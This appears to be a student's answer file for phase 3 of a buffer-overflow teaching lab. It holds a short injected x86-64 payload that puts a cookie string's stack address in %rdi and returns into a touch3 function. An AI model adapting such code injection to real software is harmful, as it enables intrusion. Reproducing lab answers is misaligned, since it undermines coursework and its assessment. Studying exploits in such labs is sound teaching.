# gcc -c solution3.s
# objdump -d solution3.s > objdump_solution3.asm

mov $0x5561dca8,%rdi  # address of string `9b997fa` in stack
push $0x4018fa        # address of touch3
retq
